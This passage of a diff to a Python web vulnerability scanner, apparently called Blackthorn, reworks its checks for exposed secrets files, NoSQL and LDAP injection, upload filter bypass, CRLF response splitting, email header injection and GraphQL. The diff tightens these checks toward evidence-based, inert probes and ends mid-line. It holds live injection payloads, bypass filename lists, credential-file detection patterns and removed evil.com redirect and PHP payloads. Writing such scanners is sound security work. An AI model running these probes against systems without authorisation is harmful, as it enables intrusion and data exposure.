+            missing = f"/__blackthorn_missing_{random.randrange(10**8, 10**9)}"
+            soft404 = self._scoped_safe_request(
+                f"{self.target}{missing}", timeout=self.timeout,
+                allow_redirects=False,
+            )
+        except Exception:
+            soft404 = None
+
+        def disclosure_signature(path: str, response: requests.Response) -> Optional[str]:
+            body = response.text[:20000]
+            lower = body.lower()
+            content = response.content or b''
+            rules = []
+            if path.startswith('/.git/'):
+                rules = [r'(?m)^\s*\[core\]\s*$', r'(?m)^ref:\s+refs/']
+            elif path.startswith('/.svn/'):
+                rules = [r'(?i)<wc-entries|svn:|^\d+\s+dir']
+            elif path.startswith('/.hg/'):
+                rules = [r'(?m)^\s*\[(?:paths|ui|web)\]\s*$']
+            elif '/.env' in path:
+                rules = [r'(?m)^(?:APP_|DB_|AWS_|REDIS_|SECRET_|API_)[A-Z0-9_]*\s*=']
+            elif path.endswith(('.sql', '/db.sql', '/dump.sql')):
+                rules = [r'(?i)(?:create\s+table|insert\s+into|mysql dump|postgresql database dump)']
+            elif path.endswith(('.log',)):
+                rules = [r'(?m)^(?:\[[^\]]+\]\s*)?(?:ERROR|CRITICAL|WARNING)\b',
+                         r'(?m)"(?:GET|POST|PUT|DELETE)\s+/\S*\s+HTTP/\d']
+            elif 'phpinfo' in path or path == '/info.php':
+                rules = [r'(?i)<title>phpinfo\(\)', r'(?i)php version\s*</td>']
+            elif path.endswith(('package.json', 'package-lock.json')):
+                rules = [r'(?s)^\s*\{.{0,500}"(?:name|lockfileVersion|dependencies)"\s*:']
+            elif path.endswith(('composer.json', 'composer.lock')):
+                rules = [r'(?s)^\s*\{.{0,500}"(?:require|packages|autoload)"\s*:']
+            elif path.endswith(('requirements.txt', 'Pipfile', 'Gemfile')):
+                rules = [r'(?m)^(?:[A-Za-z0-9_.-]+\s*(?:==|>=|~=)|source\s+["\']|gem\s+["\'])']
+            elif path.endswith(('Dockerfile',)):
+                rules = [r'(?mi)^FROM\s+[A-Za-z0-9._/-]+']
+            elif (path in ('/.travis.yml', '/.gitlab-ci.yml',
+                           '/.circleci/config.yml', '/Jenkinsfile')
+                  or path.endswith('/docker-compose.yml')):
+                rules = [r'(?mi)^(?:stages|jobs|pipeline|image|services|workflows?)\s*:']
+            elif path.endswith('.json') and ('swagger' in path or 'openapi' in path):
+                rules = [r'(?s)"(?:swagger|openapi)"\s*:\s*"\d']
+            elif path == '/.aws/credentials':
+                rules = [r'(?mi)^aws_(?:access_key_id|secret_access_key)\s*=']
+            elif path in ('/server-status', '/nginx_status', '/metrics'):
+                rules = [r'(?i)apache server status', r'(?m)^active connections:\s*\d+',
+                         r'(?m)^[A-Za-z_:][A-Za-z0-9_:]*\{?.*\}?\s+[-+0-9.eE]+$']
+            elif path.endswith(('.zip',)) and content.startswith(b'PK\x03\x04'):
+                return 'ZIP archive magic bytes'
+            elif path.endswith(('.php', '.py', '.config', '.yml', '.yaml', '.json')):
+                rules = [r'(?i)(?:password|secret|api[_-]?key|database_url|dsn)\s*["\']?\s*[:=]']
+
+            for raw in rules:
+                match = re.search(raw, body)
+                if match:
+                    return match.group(0)[:180]
+            return None
         
         def check_path(path_info):
             path, name, severity = path_info
             try:
-                resp = safe_request(
+                resp = self._scoped_safe_request(
                     f"{self.target}{path}",
                     timeout=self.timeout,
                     allow_redirects=False
                 )
                 
-                if resp and resp.status_code == 200:
-                    # Check if it's actually content (not a generic 200 page)
+                if resp is not None and resp.status_code == 200:
                     content_len = len(resp.content)
-                    if content_len > 0 and content_len != self._baseline_size:
-                        # Additional verification for specific file types
-                        content = resp.text[:500].lower()
-                        
-                        verified = False
-                        if '.git' in path and ('ref:' in content or '[core]' in content):
-                            verified = True
-                        elif '.env' in path and ('=' in content or 'password' in content or 'key' in content):
-                            verified = True
-                        elif '.sql' in path and ('insert' in content or 'create table' in content):
-                            verified = True
-                        elif 'phpinfo' in path and ('php version' in content or 'configuration' in content):
-                            verified = True
-                        elif 'package.json' in path and ('"name"' in content or '"version"' in content):
-                            verified = True
-                        elif resp.status_code == 200 and content_len > 50:
-                            verified = True
-                        
-                        if verified:
-                            return {
-                                'path': path,
-                                'name': name,
-                                'severity': severity,
-                                'status': resp.status_code,
-                                'size': content_len
-                            }
+                    if not content_len:
+                        return None
+                    if soft404 is not None:
+                        similarity = difflib.SequenceMatcher(
+                            None, _normalize_body(soft404.text),
+                            _normalize_body(resp.text),
+                        ).quick_ratio()
+                        if similarity >= 0.88:
+                            return None
+                    matched = disclosure_signature(path, resp)
+                    if matched:
+                        return {
+                            'path': path, 'name': name, 'severity': severity,
+                            'status': resp.status_code, 'size': content_len,
+                            'matched': matched,
+                            'content_type': resp.headers.get('Content-Type', ''),
+                        }
                             
             except Exception as e:
                 logger.debug(f"Disclosure check error for {path}: {e}")
@@ -5801,6 +6792,15 @@ class CloudFrontBypasser(ExtraTechniques):
                         'reason': f"Found at {result_data['path']} ({result_data['size']} bytes)",
                         'severity': result_data['severity'],
                         'category': 'INFO_DISCLOSURE',
+                        'kind': 'finding', 'verification_status': 'confirmed',
+                        'confidence': 'high', 'method': 'GET',
+                        'path': result_data['path'],
+                        'url': f"{self.target}{result_data['path']}",
+                        'evidence': [{
+                            'type': 'resource_signature',
+                            'description': 'Path-specific sensitive-resource signature',
+                            'matched': result_data['matched'],
+                        }],
                         'details': result_data
                     }
                     results.append(result)
@@ -5839,10 +6839,24 @@ class CloudFrontBypasser(ExtraTechniques):
         for payload in nosql_payloads:
             if len(payload) == 3 and payload[2]:  # JSON payload
                 continue  # Handle separately
+            query_pairs = parse_qsl(urlsplit(payload[0]).query, keep_blank_values=True)
             test_cases.append({
                 'headers': {},
                 'path': payload[0],
-                'technique': f'NoSQL: {payload[1]}'
+                'technique': f'NoSQL candidate: {payload[1]}',
+                'category': 'NOSQL_INJECTION',
+                'payload': payload[0],
+                'parameter': query_pairs[-1][0] if query_pairs else '',
+                'detector_id': 'nosql-matched-differential-v2',
+                'oracle': {
+                    'type': 'regex',
+                    'patterns': [r'mongo(?:db)?error', r'unknown (?:query )?operator',
+                                 r'badvalue.{0,80}\$(?:where|regex|ne|gt)',
+                                 r'cannot use \$where'],
+                    'severity': 'MEDIUM', 'confidence': 'medium',
+                    'verification_status': 'candidate', 'kind': 'suspected',
+                    'reason': 'NoSQL parser diagnostic appeared only after the operator probe',
+                },
             })
         
         batch_results = self._batch_test(test_cases)
@@ -5851,35 +6865,37 @@ class CloudFrontBypasser(ExtraTechniques):
         json_payloads = [p for p in nosql_payloads if len(p) == 3]
         for payload_str, technique, _ in json_payloads:
             try:
-                import json
                 payload = json.loads(payload_str)
-                resp = self._session.post(
-                    self.target,
-                    json=payload,
-                    timeout=self.timeout,
-                    verify=False
+                result = self._test_request(
+                    method='POST', path='/', data=json.dumps(payload),
+                    headers={'Content-Type': 'application/json'},
+                    technique=f'NoSQL JSON candidate: {technique}',
+                    probe={
+                        'category': 'NOSQL_INJECTION', 'payload': payload_str,
+                        'insertion_point': {'type': 'json-body', 'name': 'body'},
+                        'detector_id': 'nosql-json-differential-v2',
+                        'oracle': {
+                            'type': 'regex',
+                            'patterns': [r'mongo(?:db)?error', r'unknown (?:query )?operator',
+                                         r'badvalue.{0,80}\$(?:where|regex|ne|gt)'],
+                            'severity': 'MEDIUM', 'confidence': 'medium',
+                            'verification_status': 'candidate', 'kind': 'suspected',
+                            'reason': ('NoSQL parser diagnostic appeared only after '
+                                       'the JSON operator probe'),
+                        },
+                    },
                 )
-                
-                if resp:
-                    # Check for successful injection indicators
-                    if resp.status_code == 200 and len(resp.content) != self._baseline_size:
-                        result = {
-                            'technique': f'NoSQL: {technique}',
-                            'bypass': True,
-                            'status': resp.status_code,
-                            'reason': 'Response differs from baseline - potential injection',
-                            'severity': 'HIGH',
-                            'category': 'NOSQL_INJECTION'
-                        }
-                        results.append(result)
-                        print(f"  [✓] NoSQL Injection: {technique}")
+                if self._result_has_evidence(result, 'response_signature'):
+                    results.append(result)
+                    print(f"  [!] NoSQL candidate: {technique}")
                         
             except Exception as e:
                 logger.debug(f"NoSQL JSON test error: {e}")
         
         for r in batch_results:
             r['category'] = 'NOSQL_INJECTION'
-            results.append(r)
+            if self._result_has_evidence(r, 'response_signature'):
+                results.append(r)
         
         return results
     
@@ -5910,14 +6926,29 @@ class CloudFrontBypasser(ExtraTechniques):
         ]
         
         test_cases = [
-            {'headers': {}, 'path': path, 'technique': f'LDAP: {technique}'}
+            {
+                'headers': {}, 'path': path,
+                'technique': f'LDAP injection candidate: {technique}',
+                'category': 'LDAP_INJECTION', 'payload': path,
+                'detector_id': 'ldap-error-differential-v2',
+                'oracle': {
+                    'type': 'regex',
+                    'patterns': [r'ldap.{0,40}(?:filter|syntax|protocol) error',
+                                 r'invalid dn syntax', r'bad search filter',
+                                 r'unbalanced parenthes'],
+                    'severity': 'MEDIUM', 'confidence': 'medium',
+                    'verification_status': 'candidate', 'kind': 'suspected',
+                    'reason': 'LDAP parser diagnostic appeared only after the filter probe',
+                },
+            }
             for path, technique in ldap_payloads
         ]
         
         batch_results = self._batch_test(test_cases)
         for r in batch_results:
             r['category'] = 'LDAP_INJECTION'
-            results.append(r)
+            if self._result_has_evidence(r, 'response_signature'):
+                results.append(r)
         
         return results
     
@@ -5994,26 +7025,31 @@ class CloudFrontBypasser(ExtraTechniques):
         
         for payload, technique in json_payloads:
             try:
-                resp = self._session.post(
-                    self.target,
-                    data=payload,
+                result = self._test_request(
+                    method='POST', path='/', data=payload,
                     headers={'Content-Type': 'application/json'},
-                    timeout=self.timeout,
-                    verify=False
+                    technique=f'JSON parser behavior: {technique}',
+                    probe={
+                        'category': 'JSON_INJECTION', 'payload': payload,
+                        'insertion_point': {'type': 'json-body', 'name': 'body'},
+                        'detector_id': 'json-parser-observation-v2',
+                        'control': {
+                            'method': 'POST', 'path': '/',
+                            'headers': {'Content-Type': 'application/json'},
+                            'data': '{"blackthorn_control":true}',
+                        },
+                    },
                 )
-                
-                if resp and resp.status_code not in [400, 415]:
-                    result = {
-                        'technique': f'JSON: {technique}',
-                        'bypass': resp.status_code == 200,
-                        'status': resp.status_code,
-                        'reason': f'Server accepted malformed JSON',
-                        'severity': 'MEDIUM' if resp.status_code == 200 else 'LOW',
-                        'category': 'JSON_INJECTION'
-                    }
+                if result is not None and result.get('status') not in [400, 415]:
+                    result.update({
+                        'bypass': False, 'kind': 'observation',
+                        'verification_status': 'informational', 'confidence': 'high',
+                        'severity': 'INFO',
+                        'reason': ('Parser accepted this JSON variant; acceptance alone '
+                                   'is not an injection vulnerability'),
+                    })
                     results.append(result)
-                    if resp.status_code == 200:
-                        print(f"  [!] JSON accepted: {technique}")
+                    print(f"  [+] JSON parser accepted: {technique}")
                         
             except Exception as e:
                 logger.debug(f"JSON injection test error: {e}")
@@ -6109,9 +7145,9 @@ class CloudFrontBypasser(ExtraTechniques):
         def check_azure_blob(account: str, container: str) -> Optional[Dict]:
             try:
                 url = f"https://{account}.blob.core.windows.net/{container}?restype=container&comp=list"
-                resp = safe_request(url, timeout=5)
+                resp = self._scoped_safe_request(url, timeout=5)
                 
-                if resp and resp.status_code == 200:
+                if resp is not None and resp.status_code == 200:
                     if 'EnumerationResults' in resp.text or '<Blob>' in resp.text:
                         return {
                             'account': account,
@@ -6154,7 +7190,8 @@ class CloudFrontBypasser(ExtraTechniques):
         print("  [*] Testing GCP Storage buckets...")
         
         # Generate potential bucket names
-        domain_parts = self.domain.split('.')
+        target_hostname = urlparse(self.target).hostname or self.domain
+        domain_parts = target_hostname.split('.')
         base_name = domain_parts[0] if domain_parts else 'bucket'
         
         bucket_patterns = [
@@ -6175,9 +7212,9 @@ class CloudFrontBypasser(ExtraTechniques):
             try:
                 # Try storage.googleapis.com
                 url = f"https://storage.googleapis.com/{bucket}"
-                resp = safe_request(url, timeout=5)
+                resp = self._scoped_safe_request(url, timeout=5)
                 
-                if resp and resp.status_code in [200, 403]:
+                if resp is not None and resp.status_code in [200, 403]:
                     if resp.status_code == 200:
                         return {
                             'bucket': bucket,
@@ -6267,14 +7304,24 @@ class CloudFrontBypasser(ExtraTechniques):
                 'technique': f'Vercel/Next: {path}'
             })
         
-        batch_results = self._batch_test(test_cases, verbose=False)
+        batch_results = self._batch_test(
+            test_cases, verbose=False, include_observations=True
+        )
         
         for r in batch_results:
             if r.get('status') in [200, 201, 400, 401, 403]:
                 r['category'] = 'SERVERLESS'
+                r['bypass'] = False
+                r['kind'] = 'observation'
+                r['verification_status'] = 'informational'
+                r['severity'] = 'INFO'
+                r['reason'] = f"Serverless route candidate returned HTTP {r.get('status')}"
+                r['evidence'] = [{
+                    'type': 'route_response', 'description': r['reason'],
+                    'matched': str(r.get('status', 0)),
+                }]
                 results.append(r)
-                if r.get('bypass'):
-                    print(f"  [✓] Serverless endpoint: {r['technique']}")
+                print(f"  [i] Serverless route candidate: {r['technique']}")
         
         return results
     
@@ -6325,19 +7372,37 @@ class CloudFrontBypasser(ExtraTechniques):
             'technique': 'K8s with Bearer token'
         })
         
-        batch_results = self._batch_test(test_cases, verbose=False)
+        batch_results = self._batch_test(
+            test_cases, verbose=False, include_observations=True
+        )
         
         for r in batch_results:
             r['category'] = 'KUBERNETES'
-            # Check for K8s-specific responses
             if r.get('status') in [200, 401, 403]:
-                results.append(r)
-                if r.get('status') == 200:
-                    print(f"  [✓] K8s endpoint exposed: {r['technique']}")
-                elif r.get('status') in [401, 403]:
-                    # K8s API exists but requires auth
-                    r['severity'] = 'MEDIUM'
-                    r['reason'] = 'K8s API exists (auth required)'
+                excerpt = str((r.get('response') or {}).get('excerpt', ''))
+                k8s_signature = re.search(
+                    r'(?i)"(?:apiVersion|gitVersion|kind)"\s*:', excerpt
+                )
+                if r.get('status') == 200 and k8s_signature:
+                    r['bypass'] = True
+                    r['kind'] = 'suspected'
+                    r['verification_status'] = 'candidate'
+                    r['confidence'] = 'medium'
+                    r['severity'] = 'HIGH'
+                    r['reason'] = 'Unauthenticated Kubernetes API signature returned'
+                    r['evidence'] = [{
+                        'type': 'kubernetes_api_signature',
+                        'description': r['reason'],
+                        'matched': k8s_signature.group(0),
+                    }]
+                    results.append(r)
+                    print(f"  [!] K8s API candidate: {r['technique']}")
+                elif r.get('status') in [401, 403] and k8s_signature:
+                    r['bypass'] = False
+                    r['kind'] = 'observation'
+                    r['verification_status'] = 'informational'
+                    r['severity'] = 'INFO'
+                    r['reason'] = 'Kubernetes API signature observed; authentication required'
                     results.append(r)
         
         return results
@@ -6348,8 +7413,8 @@ class CloudFrontBypasser(ExtraTechniques):
         print("  [*] Detecting cloud provider...")
         
         try:
-            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
-            if not resp:
+            resp = self._scoped_safe_request(self.target, timeout=self.timeout, allow_redirects=True)
+            if resp is None:
                 return results
             
             headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
@@ -6479,14 +7544,19 @@ class CloudFrontBypasser(ExtraTechniques):
                     'technique': f'API: {version}{endpoint}'
                 })
         
-        batch_results = self._batch_test(test_cases, verbose=False)
+        batch_results = self._batch_test(
+            test_cases, verbose=False, include_observations=True
+        )
         
         for r in batch_results:
             r['category'] = 'API_VERSIONING'
             if r.get('status') in [200, 201]:
+                r['bypass'] = False
+                r['kind'] = 'observation'
+                r['verification_status'] = 'informational'
+                r['severity'] = 'INFO'
+                r['reason'] = 'API version route responded; authorization bypass not proven'
                 results.append(r)
-                if r.get('bypass'):
-                    print(f"  [✓] API endpoint: {r['technique']}")
         
         return results
     
@@ -6509,25 +7579,27 @@ class CloudFrontBypasser(ExtraTechniques):
         for param in dangerous_params[:10]:  # Limit tests
             try:
                 # Test via JSON
-                resp = self._session.post(
-                    self.target,
+                resp = self._scoped_safe_request(
+                    self.target, method='POST',
                     json={param: True, 'test': 'value'},
                     timeout=self.timeout,
                     verify=False
                 )
                 
-                if resp and resp.status_code in [200, 201]:
+                if resp is not None and resp.status_code in [200, 201]:
                     if param in resp.text.lower():
                         result = {
-                            'technique': f'Mass Assignment: {param}',
-                            'bypass': True,
+                            'technique': f'Mass-assignment input reflection: {param}',
+                            'bypass': False,
                             'status': resp.status_code,
-                            'reason': f'Parameter {param} accepted in response',
-                            'severity': 'HIGH',
-                            'category': 'MASS_ASSIGNMENT'
+                            'reason': (f'Parameter {param} was reflected/accepted; '
+                                       'a privileged state change and readback were not proven'),
+                            'severity': 'INFO', 'category': 'MASS_ASSIGNMENT',
+                            'kind': 'observation',
+                            'verification_status': 'informational',
                         }
                         results.append(result)
-                        print(f"  [!] Mass Assignment: {param} may be vulnerable")
+                        print(f"  [i] Mass-assignment input accepted: {param}; impact unverified")
                         
             except Exception as e:
                 logger.debug(f"Mass assignment test error: {e}")
@@ -6562,9 +7634,9 @@ class CloudFrontBypasser(ExtraTechniques):
                 else:
                     url = f"{self.target}{endpoint}"
                 
-                resp = safe_request(url, timeout=self.timeout)
+                resp = self._scoped_safe_request(url, timeout=self.timeout)
                 
-                if resp and resp.status_code == 200:
+                if resp is not None and resp.status_code == 200:
                     size = len(resp.content)
                     # Track response sizes to detect enumerable resources
                     base_endpoint = endpoint.rstrip('0123456789')
@@ -6586,16 +7658,25 @@ class CloudFrontBypasser(ExtraTechniques):
                 # Different sizes might indicate IDOR
                 if len(set(sizes)) > 1 and max(sizes) > 100:
                     result = {
-                        'technique': f'IDOR Pattern: {base}',
-                        'bypass': True,
+                        'technique': f'Object route pattern: {base}',
+                        'bypass': False,
                         'status': 200,
-                        'reason': f'Enumerable endpoint with varying responses',
-                        'severity': 'MEDIUM',
+                        'reason': ('Multiple object-shaped routes returned different content; '
+                                   'IDOR requires two identities and ownership proof'),
+                        'severity': 'INFO',
                         'category': 'IDOR',
+                        'kind': 'observation',
+                        'verification_status': 'informational',
+                        'confidence': 'medium',
+                        'evidence': [{
+                            'type': 'object_route_variation',
+                            'description': 'Route enumeration signal only',
+                            'matched': f'{len(responses)} responses / {len(set(sizes))} sizes',
+                        }],
                         'details': {'responses': responses}
                     }
                     results.append(result)
-                    print(f"  [!] IDOR: {base} shows enumerable pattern")
+                    print(f"  [i] Object route pattern: {base}; IDOR not proven")
         
         return results
     
@@ -6644,9 +7725,17 @@ class CloudFrontBypasser(ExtraTechniques):
         for r in batch_results:
             r['category'] = 'BUSINESS_LOGIC'
             if r.get('status') in [200, 201]:
+                r['bypass'] = False
+                r['kind'] = 'observation'
+                r['verification_status'] = 'informational'
+                r['severity'] = 'INFO'
+                r['reason'] = ('Boundary input received a success status; no durable '
+                               'transaction/state invariant violation was proven')
+                r['evidence'] = [{
+                    'type': 'input_acceptance', 'description': r['reason'],
+                    'matched': str(r.get('status')),
+                }]
                 results.append(r)
-                if r.get('bypass'):
-                    print(f"  [!] Logic flaw: {r['technique']}")
         
         return results
     
@@ -6663,18 +7752,18 @@ class CloudFrontBypasser(ExtraTechniques):
         
         # Email injection payloads
         injection_payloads = [
-            'test@test.com%0ABcc:evil@evil.com',
-            'test@test.com\r\nBcc:evil@evil.com',
-            'test@test.com%0ACc:evil@evil.com',
-            'test@test.com\nSubject:Injected',
-            'test@test.com%0AContent-Type:text/html',
+            'blackthorn-sender@example.invalid%0ABcc:blackthorn-probe@example.invalid',
+            'blackthorn-sender@example.invalid\r\nBcc:blackthorn-probe@example.invalid',
+            'blackthorn-sender@example.invalid%0ACc:blackthorn-probe@example.invalid',
+            'blackthorn-sender@example.invalid\nSubject:Blackthorn-Probe',
+            'blackthorn-sender@example.invalid%0AContent-Type:text/plain',
         ]
         
         for endpoint in form_endpoints:
             for payload in injection_payloads[:3]:
                 try:
-                    resp = self._session.post(
-                        f"{self.target}{endpoint}",
+                    resp = self._scoped_safe_request(
+                        f"{self.target}{endpoint}", method='POST',
                         data={
                             'email': payload,
                             'name': 'test',
@@ -6685,19 +7774,40 @@ class CloudFrontBypasser(ExtraTechniques):
                         verify=False
                     )
                     
-                    if resp and resp.status_code in [200, 302]:
+                    if resp is not None and resp.status_code in [200, 302]:
                         # Check for injection acceptance
                         if 'thank' in resp.text.lower() or 'success' in resp.text.lower() or resp.status_code == 302:
                             result = {
-                                'technique': f'Email Injection: {endpoint}',
-                                'bypass': True,
+                                'technique': f'Email delimiter acceptance: {endpoint}',
+                                'bypass': False,
                                 'status': resp.status_code,
-                                'reason': 'Form accepted potentially malicious email',
-                                'severity': 'MEDIUM',
-                                'category': 'EMAIL_INJECTION'
+                                'reason': ('Form accepted an address containing header delimiters; '
+                                           'delivery/header injection was not observed'),
+                                'severity': 'INFO',
+                                'category': 'EMAIL_INJECTION',
+                                'kind': 'observation',
+                                'verification_status': 'informational',
+                                'confidence': 'medium',
+                                'method': 'POST', 'path': endpoint,
+                                'url': f'{self.target}{endpoint}',
+                                'payload': payload,
+                                'request': {
+                                    'method': 'POST', 'url': f'{self.target}{endpoint}',
+                                    'path': endpoint, 'headers': {},
+                                    'body': {'email': payload, 'name': 'test',
+                                             'message': 'test', 'subject': 'test'},
+                                },
+                                'response': {'status': resp.status_code},
+                                'evidence': [{
+                                    'type': 'input_acceptance',
+                                    'description': ('Application displayed a form-success '
+                                                    'response for delimiter-bearing input'),
+                                    'matched': str(resp.status_code),
+                                }],
+                                '_no_reconfirm': True,
                             }
                             results.append(result)
-                            print(f"  [!] Email injection possible at {endpoint}")
+                            print(f"  [i] Email delimiter input accepted at {endpoint}")
                             break
                             
                 except Exception as e:
@@ -6715,55 +7825,80 @@ class CloudFrontBypasser(ExtraTechniques):
             '/upload', '/api/upload', '/file/upload', '/files',
             '/attachments', '/media', '/images', '/documents'
         ]
+        suffix = str(random.randrange(10**8, 10**9))
         
         # Bypass techniques (filename, content-type, description)
         bypass_tests = [
-            ('test.php', 'image/jpeg', 'PHP as JPEG'),
-            ('test.php.jpg', 'image/jpeg', 'Double extension'),
-            ('test.jpg.php', 'image/jpeg', 'Reverse double ext'),
-            ('test.pHp', 'application/x-php', 'Case variation'),
-            ('test.php%00.jpg', 'image/jpeg', 'Null byte'),
-            ('test.php;.jpg', 'image/jpeg', 'Semicolon bypass'),
-            ('test.php::$DATA', 'application/octet-stream', 'NTFS ADS'),
-            ('test.phtml', 'text/html', 'Alternative PHP ext'),
-            ('test.php5', 'application/x-php', 'PHP5 extension'),
-            ('test.shtml', 'text/html', 'SSI extension'),
-            ('.htaccess', 'text/plain', 'Apache config'),
-            ('test.svg', 'image/svg+xml', 'SVG (XSS)'),
+            (f'blackthorn-{suffix}.php', 'image/jpeg', 'PHP extension as JPEG'),
+            (f'blackthorn-{suffix}.php.jpg', 'image/jpeg', 'Double extension'),
+            (f'blackthorn-{suffix}.jpg.php', 'image/jpeg', 'Reverse double extension'),
+            (f'blackthorn-{suffix}.pHp', 'application/octet-stream', 'Case variation'),
+            (f'blackthorn-{suffix}.php%00.jpg', 'image/jpeg', 'Null-byte filename'),
+            (f'blackthorn-{suffix}.php;.jpg', 'image/jpeg', 'Semicolon filename'),
+            (f'blackthorn-{suffix}.php::$DATA', 'application/octet-stream', 'NTFS ADS filename'),
+            (f'blackthorn-{suffix}.phtml', 'text/plain', 'Alternative PHP extension'),
+            (f'blackthorn-{suffix}.php5', 'text/plain', 'PHP5 extension'),
+            (f'blackthorn-{suffix}.shtml', 'text/plain', 'SSI extension'),
+            (f'blackthorn-{suffix}.txt', 'text/plain', 'Control extension'),
         ]
-        
-        fake_php_content = b'<?php echo "test"; ?>'
-        fake_image_header = b'\xff\xd8\xff\xe0'  # JPEG magic bytes
+
+        # Deliberately inert content: filename validation can be observed without
+        # uploading executable server-side code.
+        inert_content = (b'\xff\xd8\xff\xe0BLACKTHORN-INERT-UPLOAD-' +
+                         suffix.encode('ascii'))
         
         for endpoint in upload_endpoints[:3]:
             for filename, content_type, technique in bypass_tests[:5]:
                 try:
-                    # Create payload with magic bytes + PHP
-                    content = fake_image_header + fake_php_content
-                    
                     files = {
-                        'file': (filename, content, content_type)
+                        'file': (filename, inert_content, content_type)
                     }
                     
-                    resp = self._session.post(
-                        f"{self.target}{endpoint}",
+                    resp = self._scoped_safe_request(
+                        f"{self.target}{endpoint}", method='POST',
                         files=files,
                         timeout=self.timeout,
                         verify=False
                     )
                     
-                    if resp and resp.status_code in [200, 201]:
+                    if resp is not None and resp.status_code in [200, 201]:
                         if 'success' in resp.text.lower() or 'uploaded' in resp.text.lower():
                             result = {
-                                'technique': f'Upload Bypass: {technique}',
+                                'technique': f'Upload validation candidate: {technique}',
                                 'bypass': True,
                                 'status': resp.status_code,
-                                'reason': f'File {filename} accepted at {endpoint}',
-                                'severity': 'HIGH',
-                                'category': 'FILE_UPLOAD'
+                                'reason': (f'Inert file {filename} was accepted at {endpoint}; '
+                                           'retrieval, content-type confusion, and execution '
+                                           'are not proven'),
+                                'severity': 'LOW',
+                                'category': 'FILE_UPLOAD',
+                                'kind': 'suspected',
+                                'verification_status': 'candidate',
+                                'confidence': 'medium',
+                                'method': 'POST', 'path': endpoint,
+                                'url': f'{self.target}{endpoint}',
+                                'payload': filename,
+                                'request': {
+                                    'method': 'POST', 'url': f'{self.target}{endpoint}',
+                                    'path': endpoint,
+                                    'headers': {'Content-Type': 'multipart/form-data'},
+                                    'body': f'inert upload file={filename}',
+                                },
+                                'response': {
+                                    'status': resp.status_code,
+                                    'excerpt': resp.text[:300],
+                                },
+                                'evidence': [{
+                                    'type': 'upload_acceptance',
+                                    'description': ('Application returned an explicit upload '
+                                                    'success response'),
+                                    'matched': filename,
+                                }],
+                                '_no_reconfirm': True,
                             }
                             results.append(result)
-                            print(f"  [✓] Upload bypass: {technique} at {endpoint}")
+                            print(f"  [!] Upload validation candidate: {technique} at {endpoint}")
+                            break
                             
                 except Exception as e:
                     logger.debug(f"Upload test error: {e}")
@@ -6771,29 +7906,37 @@ class CloudFrontBypasser(ExtraTechniques):
         return results
     
     def _test_response_splitting(self) -> List[Dict[str, Any]]:
-        """Test for HTTP response splitting"""
-        results = []
-        print("  [*] Testing HTTP response splitting...")
-        
-        # Response splitting payloads
-        split_payloads = [
-            ('?lang=en%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK', 'Basic split'),
-            ('?redirect=%0d%0aSet-Cookie:evil=value', 'Cookie injection'),
-            ('?next=%0d%0aLocation:%20http://evil.com', 'Location injection'),
-            ('?callback=%0d%0a%0d%0a<html>injected</html>', 'Body injection'),
+        """Require an exact randomized response-header canary.
+
+        A response-size change after CR/LF input is not response splitting, and
+        body reflection cannot prove a new HTTP message boundary. Only a header
+        that the target actually emits is promoted.
+        """
+        print("  [*] Testing response splitting with exact header canaries...")
+        suffix = str(random.randrange(10**8, 10**9))
+        header_name = f'X-Blackthorn-Split-{suffix}'
+        header_value = f'bt-split-{suffix}'
+        test_cases = []
+        for parameter in ('lang', 'redirect', 'next', 'callback'):
+            payload = f'clean%0d%0a{header_name}:%20{header_value}'
+            test_cases.append({
+                'headers': {},
+                'path': f'/?{parameter}={payload}',
+                'technique': f'Response splitting: {parameter}',
+                'category': 'RESPONSE_SPLITTING',
+                'parameter': parameter, 'payload': payload,
+                'detector_id': 'response-splitting-header-v2',
+                'oracle': {
+                    'type': 'header', 'name': header_name,
+                    'value': header_value, 'severity': 'HIGH',
+                    'reason': (f'Injected response header observed: '
+                               f'{header_name}: {header_value}'),
+                },
+            })
+        return [
+            result for result in self._batch_test(test_cases)
+            if self._result_has_evidence(result, 'response_header_injection')
         ]
-        
-        test_cases = [
-            {'headers': {}, 'path': path, 'technique': f'Response Split: {technique}'}
-            for path, technique in split_payloads
-        ]
-        
-        batch_results = self._batch_test(test_cases)
-        for r in batch_results:
-            r['category'] = 'RESPONSE_SPLITTING'
-            results.append(r)
-        
-        return results
     
     def _test_clickjacking(self) -> List[Dict[str, Any]]:
         """Test for clickjacking vulnerabilities"""
@@ -6801,8 +7944,8 @@ class CloudFrontBypasser(ExtraTechniques):
         print("  [*] Testing clickjacking protection...")
         
         try:
-            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
-            if not resp:
+            resp = self._scoped_safe_request(self.target, timeout=self.timeout, allow_redirects=True)
+            if resp is None:
                 return results
             
             headers_lower = {k.lower(): v for k, v in resp.headers.items()}
@@ -6995,23 +8138,25 @@ class CloudFrontBypasser(ExtraTechniques):
             
             # Test introspection
             try:
-                resp = self._session.post(
-                    url,
+                resp = self._scoped_safe_request(
+                    url, method='POST',
                     json={'query': introspection_query},
                     headers={'Content-Type': 'application/json'},
                     timeout=self.timeout,
                     verify=False
                 )
                 
-                if resp and resp.status_code == 200:
+                if resp is not None and resp.status_code == 200:
                     if '__schema' in resp.text or 'queryType' in resp.text:
                         result = {
                             'technique': f'GraphQL Introspection: {endpoint}',
-                            'bypass': True,
+                            'bypass': False,
                             'status': resp.status_code,
-                            'reason': 'Full schema introspection enabled - exposes all types and fields',
-                            'severity': 'HIGH',
-                            'category': 'GRAPHQL_ATTACK'
+                            'reason': ('Full schema introspection is enabled; record as '
+                                       'policy context, not a vulnerability by itself'),
+                            'severity': 'INFO', 'category': 'GRAPHQL_ATTACK',
+                            'kind': 'observation',
+                            'verification_status': 'informational',
                         }
                         results.append(result)
                         print(f"  [✓] GraphQL Introspection enabled at {endpoint}")
@@ -7021,23 +8166,25 @@ class CloudFrontBypasser(ExtraTechniques):
             
             # Test batching
             try:
-                resp = self._session.post(
-                    url,
+                resp = self._scoped_safe_request(
+                    url, method='POST',
                     json=batching_query[:10],  # Test with 10 first
                     headers={'Content-Type': 'application/json'},
                     timeout=self.timeout + 5,
                     verify=False
                 )
                 
-                if resp and resp.status_code == 200:
+                if resp is not None and resp.status_code == 200:
                     if isinstance(resp.json(), list):
                         result = {
                             'technique': f'GraphQL Batching DoS: {endpoint}',
-                            'bypass': True,
+                            'bypass': False,
                             'status': resp.status_code,
-                            'reason': 'Query batching enabled - potential DoS vector',
